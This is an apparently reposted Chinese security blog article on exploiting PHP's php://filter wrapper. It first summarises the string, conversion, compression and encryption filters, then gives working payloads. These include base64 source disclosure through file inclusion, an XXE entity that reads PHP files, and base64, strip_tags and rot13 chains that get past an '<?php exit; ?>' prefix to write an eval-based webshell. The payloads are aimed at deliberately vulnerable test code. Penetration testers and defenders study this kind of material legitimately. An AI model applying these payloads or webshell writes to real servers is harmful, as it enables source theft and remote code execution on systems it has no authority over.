> 原文链接: https://www.anquanke.com//post/id/202510 


# 探索php://filter在实战当中的奇技淫巧


                                阅读量   
                                **652992**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t012b907328af8dab4f.png)](https://p2.ssl.qhimg.com/t012b907328af8dab4f.png)



## 前言

在渗透测试或漏洞挖掘的过程中，我们经常会遇到`php://filter`结合其它漏洞比如文件包含、文件读取、反序列化、XXE等进行组合利用，以达到一定的攻击效果，拿到相应的服务器权限。

最近看到`php://filter`在ThinkPHP反序列化中频繁出现利用其相应构造可以RCE，那么下面就来探索一下关于`php://filter`在漏洞挖掘中的一些奇技淫巧。



## php://filter

在探索php://filter在实战当中的奇技淫巧时，一定要先了解关于php://filter的原理和利用。

对于PHP官方手册介绍如下

> php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。

### <a class="reference-link" name="%E5%8F%82%E6%95%B0"></a>参数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dfb9934f51564ea2.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8"></a>使用

通过参数去了解php://filter的使用
- 测试代码
```
&lt;?php
    $file1 = $_GET['file1'];
    $file2 = $_GET['file2'];
    $txt = $_GET['txt'];
    echo file_get_contents($file1);
    file_put_contents($file2,$txt);
?&gt;
```
- 读取文件
payload：

```
# 明文读取
index.php?file1=php://filter/resource=file.txt

# 编码读取
index.php?file1=php://filter/read=convert.base64-encode/resource=file.txt
```

测试结果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0115c45075c550ba49.png)
- 写入文件
payload：

```
# 明文写入
index.php?file2=php://filter/resource=test.txt&amp;txt=Qftm

# 编码写入
index.php?file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=Qftm
```

测试结果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e1ab79258ad53b54.png)

### <a class="reference-link" name="%E8%BF%87%E6%BB%A4%E5%99%A8"></a>过滤器

通过参考[官方过滤器](https://www.php.net/manual/zh/filters.php)的解释，进行一个简单的描述总结（版本、以及使用的介绍）

<a class="reference-link" name="String%20Filters"></a>**String Filters**

String Filters（字符串过滤器）每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应。

<a class="reference-link" name="string.rot13"></a>**string.rot13**

（自 PHP 4.3.0 起）使用此过滤器等同于用 [str_rot13()](https://www.php.net/manual/zh/function.str-rot13.php)函数处理所有的流数据。

`string.rot13`对字符串执行 ROT13 转换，ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。
- Example #1 string.rot13
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'string.rot13');
fwrite($fp, "This is a test.\n");
/* Outputs:  Guvf vf n grfg.   */
?&gt;
```

<a class="reference-link" name="string.toupper"></a>**string.toupper**

（自 PHP 5.0.0 起）使用此过滤器等同于用 [strtoupper()](https://www.php.net/manual/zh/function.strtoupper.php)函数处理所有的流数据。

string.toupper 将字符串转化为大写
- Example #2 string.toupper
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'string.toupper');
fwrite($fp, "This is a test.\n");
/* Outputs:  THIS IS A TEST.   */
?&gt;
```

<a class="reference-link" name="string.tolower"></a>**string.tolower**

（自 PHP 5.0.0 起）使用此过滤器等同于用 [strtolower()](https://www.php.net/manual/zh/function.strtolower.php)函数处理所有的流数据。

string.toupper 将字符串转化为小写
- Example #3 string.tolower
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'string.tolower');
fwrite($fp, "This is a test.\n");
/* Outputs:  this is a test.   */
?&gt;
```

<a class="reference-link" name="string.strip_tags"></a>**string.strip_tags**

(PHP 4, PHP 5, PHP 7)（自PHP 7.3.0起已弃用此功能。）

使用此过滤器等同于用 [strip_tags()](https://www.php.net/manual/zh/function.strip-tags.php)函数处理所有的流数据。可以用两种格式接收参数：一种是和 [strip_tags()](https://www.php.net/manual/zh/function.strip-tags.php)函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。

string.strip_tags从字符串中去除 HTML 和 PHP 标记，尝试返回给定的字符串 `str` 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 [fgetss()](https://www.php.net/manual/zh/function.fgetss.php) 一样的机制去除标记。

```
Note:

HTML 注释和 PHP 标签也会被去除。这里是硬编码处理的，所以无法通过 allowable_tags 参数进行改变。
```
- Example #4 string.strip_tags
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE, "&lt;b&gt;&lt;i&gt;&lt;u&gt;");
fwrite($fp, "&lt;b&gt;bolded text&lt;/b&gt; enlarged to a &lt;h1&gt;level 1 heading&lt;/h1&gt;\n");
fclose($fp);
/* Outputs:  &lt;b&gt;bolded text&lt;/b&gt; enlarged to a level 1 heading   */

$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE, array('b','i','u'));
fwrite($fp, "&lt;b&gt;bolded text&lt;/b&gt; enlarged to a &lt;h1&gt;level 1 heading&lt;/h1&gt;\n");
fclose($fp);
/* Outputs:  &lt;b&gt;bolded text&lt;/b&gt; enlarged to a level 1 heading   */
?&gt;
```

### <a class="reference-link" name="Conversion%20Filters"></a>**Conversion Filters**

Conversion Filters（转换过滤器）如同 string.** 过滤器，convert.** 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。

<a class="reference-link" name="convert.base64"></a>**convert.base64**

convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 [base64_encode()](https://www.php.net/manual/zh/function.base64-encode.php)和 [base64_decode()](https://www.php.net/manual/zh/function.base64-decode.php)函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了 `line-length`，base64 输出将被用 `line-length`个字符为 长度而截成块。如果给出了 `line-break-chars`，每块将被用给出的字符隔开。这些参数的效果和用 [base64_encode()](https://www.php.net/manual/zh/function.base64-encode.php)再加上 [chunk_split()](https://www.php.net/manual/zh/function.chunk-split.php)相同。
- Example #1 convert.base64-encode &amp; convert.base64-decode
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.base64-encode');
fwrite($fp, "This is a test.\n");
fclose($fp);
/* Outputs:  VGhpcyBpcyBhIHRlc3QuCg==  */

$param = array('line-length' =&gt; 8, 'line-break-chars' =&gt; "\r\n");
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);
fwrite($fp, "This is a test.\n");
fclose($fp);
/* Outputs:  VGhpcyBp
          :  cyBhIHRl
          :  c3QuCg==  */

$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.base64-decode');
fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==");
fclose($fp);
/* Outputs:  This is a test.  */
?&gt;
```

<a class="reference-link" name="convert.quoted"></a>**convert.quoted**

**convert.quoted-printable-encode**和 **convert.quoted-printable-decode**使用此过滤器的 decode 版本等同于用 [quoted_printable_decode()](https://www.php.net/manual/zh/function.quoted-printable-decode.php)函数处理所有的流数据。没有和 **convert.quoted-printable-encode**相对应的函数。 **convert.quoted-printable-encode**支持以一个关联数组给出的参数。除了支持和 **convert.base64-encode**一样的附加参数外， **convert.quoted-printable-encode**还支持布尔参数 `binary`和 `force-encode-first`。 **convert.base64-decode**只支持 `line-break-chars`参数作为从编码载荷中剥离的类型提示。
- Example #2 convert.quoted-printable-encode &amp; convert.quoted-printable-decode
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.quoted-printable-encode');
fwrite($fp, "This is a test.\n");
/* Outputs:  =This is a test.=0A  */
?&gt;
```

<a class="reference-link" name="convert.iconv.*"></a>**convert.iconv.***

这个过滤器需要 php 支持 `iconv`，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用[iconv()](https://www.php.net/manual/zh/function.iconv.php)函数处理所有的流数据。

```
Note 该过滤在PHP中文手册里面没有标注，可查看英文手册

https://www.php.net/manual/en/filters.convert.php
```

`convery.iconv.*`的使用有两种方法

```
convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 
or 
convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;
```
- iconv()
(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)

iconv — 字符串按要求的字符编码来转换

说明

```
iconv ( string $in_charset , string $out_charset , string $str ) : string
```

将字符串 `str` 从 `in_charset` 转换编码到 `out_charset`。

参数

```
in_charset

  输入的字符集。

out_charset

  输出的字符集。如果你在 out_charset 后添加了字符串 //TRANSLIT，将启用转写（transliteration）功能。这个意思是，当一个字符不能被目标字符集所表示时，它可以通过一个或多个形似的字符来近似表达。 如果你添加了字符串 //IGNORE，不能以目标字符集表达的字符将被默默丢弃。 否则，会导致一个 E_NOTICE并返回 FALSE。

str
    要转换的字符串。
```

返回值

```
返回转换后的字符串， 或者在失败时返回 **`FALSE`**。
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018c7eb5fd08b90439.png)

Example #1 iconv()

```
&lt;?php
$text = "This is the Euro symbol '€'.";

echo 'Original : ', $text, PHP_EOL;
echo 'TRANSLIT : ', iconv("UTF-8", "ISO-8859-1//TRANSLIT", $text), PHP_EOL;
echo 'IGNORE   : ', iconv("UTF-8", "ISO-8859-1//IGNORE", $text), PHP_EOL;
echo 'Plain    : ', iconv("UTF-8", "ISO-8859-1", $text), PHP_EOL;

/* Outputs:
Original : This is the Euro symbol '€'.
TRANSLIT : This is the Euro symbol 'EUR'.
IGNORE   : This is the Euro symbol ''.
Plain    :
Notice: iconv(): Detected an illegal character in input string in .\iconv-example.php on line 7
*/

?&gt;
```
- Example #3 convert.iconv.*
```
&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.iconv.utf-16le.utf-8');
fwrite($fp, "T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0");
fclose($fp);
/* Outputs: This is a test. */
?&gt;
```

支持的字符编码有一下几种（详细参考[官方手册](https://www.php.net/manual/en/mbstring.supported-encodings.php)）

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
、、、、、、、
、、、、、、、
```

Note

```
* 表示该编码也可以在正则表达式中使用。

** 表示该编码自 PHP 5.4.0 始可用。
```

### <a class="reference-link" name="Compression%20Filters"></a>Compression Filters

虽然 [压缩封装协议](https://www.php.net/manual/zh/wrappers.compression.php)提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。

```
Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。
```

zlib.** 压缩过滤器自 PHP 版本 **5.1.0**起可用，在激活 [zlib](https://www.php.net/manual/zh/ref.zlib.php)的前提下。也可以通过安装来自 [» PECL](https://pecl.php.net/)的 [» zlib_filter](https://pecl.php.net/package/zlib_filter)包作为一个后门在 **5.0.x**版中使用。此过滤器在 PHP 4 中 **不可用*。

bzip2.** 压缩过滤器自 PHP 版本 **5.1.0**起可用，在激活 [bz2](https://www.php.net/manual/zh/ref.bzip2.php)支持的前提下。也可以通过安装来自 [» PECL](https://pecl.php.net/)的 [» bz2_filter](https://pecl.php.net/package/bz2_filter)包作为一个后门在 **5.0.x**版中使用。此过滤器在 PHP 4 中 **不可用*。

详细细节参考官方文档

```
https://www.php.net/manual/zh/filters.compression.php
```

### <a class="reference-link" name="Encryption%20Filters"></a>Encryption Filters

mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 [mcrypt 扩展库](https://www.php.net/manual/zh/ref.mcrypt.php)中相同的算法，格式为 **mcrypt.ciphername**，其中 `ciphername`是密码的名字，将被传递给 [mcrypt_module_open()](https://www.php.net/manual/zh/function.mcrypt-module-open.php)。有以下五个过滤器参数可用：

[![](https://p5.ssl.qhimg.com/t017821fa98a3289bfb.png)](https://p5.ssl.qhimg.com/t017821fa98a3289bfb.png)

详细细节参考官方文档

```
https://www.php.net/manual/zh/filters.encryption.php
```

在了解了有关`php://filter`的原理和利用之后，下面开始探索php://filter在漏洞挖掘中的奇妙之处。



## 文件包含

文件包含漏洞顾名思义即：包含恶意代码或恶意内容达到一定的攻击效果。

在文件包含漏洞当中，因为php://filter可以对所有文件进行编码处理，所以常常可以使用php://filter来包含读取一些特殊敏感的文件（配置文件、脚本文件等）以辅助后面的漏洞挖掘。

### <a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>测试代码

```
&lt;?php
    $file  = $_GET['file'];
    include($file);
?&gt;
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

**利用条件**：无

**利用姿势1**：

```
index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。同时也能够对网站源码进行审计。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011e795d3b9e47b3c0.png)

**利用姿势2**：

```
index.php?file=php://filter/convert.base64-encode/resource=index.php
```

效果跟前面一样，只是少了个read关键字，在绕过一些waf时也许有用。



## XXE Encode

### <a class="reference-link" name="XXE%E6%BC%8F%E6%B4%9E"></a>XXE漏洞

XXE漏洞也就是XML外部实体注入漏洞，关于该漏洞造成的主要原因是libxml库【libxml2.9以前的版本默认支持并开启了外部实体的引用】，对于防范XXE漏洞也很简单：升级libxml版本、使用脚本语言自带的禁用xml外部实体解析。

### <a class="reference-link" name="XXE%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98%E7%BB%95%E8%BF%87"></a>XXE回显问题绕过

在P牛[文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)里面有提到使用php://filter绕过xxe回显问题，详细细节和操作如下：

大家都知道XXE漏洞和XML有关系，当存在XXE漏洞的时候，如果我们使用相关协议读取特殊文件（HTML、PHP等）就可能会报错`parser error : StartTag: invalid element name`，为什么会这样呢，主要是因为XML的文件格式（xml文件声明和html以及php文件一样都是基于标签的，正是因为这样在读取这些特殊文件的时候就会解析错误）。

针对这种情况就可以使用php://filter协议来进行文件内容编码读取，避免和xml文件解析产生冲突。
- payload
```
&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./xxe.php" &gt;]&gt;
```



## Bypass file_put_contents Exit

关于这段代码`&lt;?php exit; ?&gt;`想必大家在漏洞挖掘中写入shell的时候经常会遇到，在这样的情况下无论写入的shell是否成功都不会执行传入的恶意代码，因为在恶意代码执行之前程序就已经结束退出了，导致shell后门利用失败。

实际漏洞挖掘当中主要会遇到以下两种限制：
- 写入shell的文件名和内容不一样（前后变量不同）
- 写入shell的文件名和内容一样（前后变量相同）
针对以上不同的限制手法所利用的姿势与技巧也不太一样，不过原理都是一样的，都需要利用相应的编码解码操作绕过头部限制写入能解析的恶意代码。下面主要针对脚本里面的`exit`限制手段进行探索与绕过。

### <a class="reference-link" name="Bypass-%E4%B8%8D%E5%90%8C%E5%8F%98%E9%87%8F"></a>Bypass-不同变量

这种情况主要是针对写入shell的文件名和内容的变量不一样的时候进行探索绕过，其中的文件名主要是传入我们的php伪协议，而文件内容则传入我们精心构造的恶意数据，最终也就是通过php伪协议和内容数据进行相应的编码解码绕过自身的头部限制，使传入的恶意代码能够正常解析也就达到了目的。

关于这种情景下的利用分析主要参考最早P牛16年发布的一篇文章：[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，里面介绍了当写入shell并且内容可控的时候绕过`exit`头部限制，具体分析介绍如下：

<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>**测试代码**

```
&lt;?php
$content = '&lt;?php exit; ?&gt;';
$content .= $_POST['txt'];
file_put_contents($_POST['filename'], $content);
?&gt;
```

<a class="reference-link" name="%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"></a>**代码分析**

分析代码可以看到，`$content`在开头增加了exit，导致文件运行直接退出！！

在这种情况下该怎么绕过这个限制呢，思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。

### <a class="reference-link" name="Bypass-%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"></a>Bypass-转换过滤器

在上面的介绍中我们知道`php://filter`中`convert.base64-encode`和`convert.base64-decode`使用这两个过滤器等同于分别用 `base64_encode()`和 `base64_decode()`函数处理所有的流数据。

在代码中可以看到`$_POST['filename']`是可以控制协议的，既然可以控制协议，那么我们就可以使用php://filter协议的转换过滤器进行base64编码与解码来绕过限制。所以我们可以将`$content`内容进行解码，利用php base64_decode函数特性去除“exit”。

<a class="reference-link" name="Base64%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81"></a>**Base64编码与解码**

Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。
- **base64索引表**
base64编码与解码的基础索引表如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f92fd8331d635a49.png)
- **Base64编码原理**
（1）base64编码过程

Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。

Base64将输入字符串按字节切分，取得每个字节对应的二进制值（若不足8比特则高位补0），然后将这些二进制数值串联起来，再按照6比特一组进行切分（因为2^6=64），最后一组若不足6比特则末尾补0。将每组二进制值转换成十进制，然后在上述表格中找到对应的符号并串联起来就是Base64编码结果。

由于二进制数据是按照8比特一组进行传输，因此Base64按照6比特一组切分的二进制数据必须是24比特的倍数（6和8的最小公倍数）。24比特就是3个字节，若原字节序列数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。

完整的Base64定义可见RFC1421和RFC2045。因为Base64算法是将3个字节原数据编码为4个字节新数据，所以Base64编码后的数据比原始数据略长，为原来的4/3。

（2）简单编码流程

```
1）将所有字符转化为ASCII码；

2）将ASCII码转化为8位二进制；

3）将8位二进制3个归成一组(不足3个在后边补0)共24位，再拆分成4组，每组6位；

4）将每组6位的二进制转为十进制；

5）从Base64编码表获取十进制对应的Base64编码；
```

下面举例对字符串`“ABCD”`进行base64编码：

[![](https://p2.ssl.qhimg.com/t0166f648f3dde80678.png)](https://p2.ssl.qhimg.com/t0166f648f3dde80678.png)

对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。
- **Base64解码原理**
（1）base64解码过程

base64解码，即是base64编码的逆过程，如果理解了编码过程，解码过程也就容易理解。将base64编码数据根据编码表分别索引到编码值，然后每4个编码值一组组成一个24位的数据流，解码为3个字符。对于末尾位“=”的base64数据，最终取得的4字节数据，需要去掉“=”再进行转换。

（2）base64解码特点

base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。下面编写一个简单的代码，测试一组数据看是否满足我们所说的情况。

测试代码

探测base64_decode解码的特点

```
&lt;?php
/**
 * Created by PhpStorm.
 * User: Qftm
 * Date: 2020/3/17
 * Time: 9:16
 */

$basestr0="QftmrootQftm";
$basestr1="Qftm#root@Qftm";
$basestr2="Qftm^root&amp;Qftm";
$basestr3="Qft&gt;mro%otQftm";
$basestr4="Qf%%%tmroo%%%tQftm";

echo base64_decode($basestr0)."\n";
echo base64_decode($basestr1)."\n";
echo base64_decode($basestr2)."\n";
echo base64_decode($basestr3)."\n";
echo base64_decode($basestr4)."\n";
?&gt;
```

运行结果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ae45a568bc2e5d0b.png)

从结果中可以看到一个字符串中，不管出现多少个特殊字符或者位置上的差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

<a class="reference-link" name="Bypass"></a>**Bypass**

知道php base64解码特点之后，当`$content`被加上了`&lt;?php exit; ?&gt;`以后，我们可以使用 `php://filter/write=convert.base64-decode` 来首先对其解码。在解码的过程中，字符`&lt; ? ; &gt; 空格`等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。

由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符`（Q）`就可以，这样”phpexitQ”被正常解码，而后面我们传入的webshell的base64内容也被正常解码，这样就会将`&lt;?php exit; ?&gt;`这部分内容给解码掉，从而不会影响我们写入的webshell。
- payload
```
http://192.33.6.145/test.php

POST
txt=QPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php

base64decode组成
phpe xitQ PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+
```
- 载荷效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0130236e69c5e13e87.png)

从服务器上可以看到已经生成shell.php，同时`&lt;?php exit; ?&gt;`这部分已经被解码掉了。

### <a class="reference-link" name="Bypass-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8"></a>Bypass-字符串过滤器

除了可以使用php://filter的转换过滤器绕过以外还可以使用其字符串过滤器进行绕过利用。

<a class="reference-link" name="string.strip_tags"></a>**string.strip_tags**

利用php://filter中`string.strip_tags`过滤器去除”exit”。使用此过滤器等同于用 strip_tags()函数处理所有的流数据。我们观察一下，这个`&lt;?php exit; ?&gt;`，实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它。
- 测试代码
```
&lt;?php
echo readfile('php://filter/read=string.strip_tags/resource=php://input');
?&gt;
```
- 测试payload
```
php://filter/read=string.strip_tags/resource=php://input
```
- 载荷效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d7910de5b759d99a.png)

载荷利用虽然成功了，但是我们的目的是写入webshell，如果那样的话，我们的webshell岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（php://filter允许通过 `|` 使用多个过滤器）。
- 具体步骤分析
```
1、webshell用base64编码   //为了避免strip_tags的影响

2、调用string.strip_tags //这一步将去除&lt;?php exit; ?&gt;

3、调用convert.base64-decode //这一步将还原base64编码的webshell
```
- payload
```
http://192.33.6.145/test.php

POST
txt=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php
```
- 载荷效果
[![](https://p4.ssl.qhimg.com/t014c436917648b755c.png)](https://p4.ssl.qhimg.com/t014c436917648b755c.png)

从服务上可以看到已经生成shell.php，同时`&lt;?php exit; ?&gt;`这部分已经被`string.strip_tags`去除掉。

在字符串过滤器中除了使用`string.strip_tags`Bypass外还可以使用`string.rot13`进行Bypass利用，下面通过分析了解其利用手法。

<a class="reference-link" name="string.rot13"></a>**string.rot13**

在上面的php://filter讲解中，我们知道string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。
- str_rot13()
```
str_rot13() 函数对字符串执行 ROT13 编码。

ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。

编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。
```
- 分析绕过
分析利用php://filter中`string.rot13`过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除`exit`。`&lt;?php exit; ?&gt;`在经过rot13编码后会变成`&lt;?cuc rkvg; ?&gt;`，不过这种利用手法的前提是PHP不开启`short_open_tag`

查看官方给的说明[手册](https://www.php.net/manual/zh/ini.core.php)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01efdd48635b4ae924.png)

```
short_open_tag boolean

决定是否允许使用 PHP 代码开始标志的缩写形式（&lt;? ?&gt;）。如果要和 XML 结合使用 PHP，可以禁用此选项以便于嵌入使用 &lt;?xml ?&gt;。否则还可以通过 PHP 来输出，例如：&lt;?php echo '&lt;?xml version="1.0"'; ?&gt;。如果禁用了，必须使用 PHP 代码开始标志的完整形式（&lt;?php ?&gt;）。
```

虽然官方说的默认开启，但是在php.ini中默认是注释掉的，也就是说它还是默认关闭。

```
; short_open_tag
;   Default Value: On
;   Development Value: Off
;   Production Value: Off
```

[![](https://p3.ssl.qhimg.com/t011707fd788707a174.png)](https://p3.ssl.qhimg.com/t011707fd788707a174.png)

PS：有一点奇怪的是，Linux下查看是正常的，但是在windows下同样的配置查看显示的是开启的，难道是phpstudy的锅？还是说是不同系统的问题？有了解的师傅可以告诉一下。
- payload
```
POST
txt=&lt;?cuc @riny($_CBFG[Dsgz])?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php

&lt;?php exit; ?&gt;      &lt;?cuc rkvg; ?&gt;

&lt;?php @eval($_POST[Qftm])?&gt;   &lt;?cuc @riny($_CBFG[Dsgz])?&gt;

```
- 载荷效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01016d5d6290da6d53.png)

从服务上可以看到已经生成shell.php，同时`&lt;?php exit; ?&gt;`这部分已经被`string.rot13`编码所处理掉了。

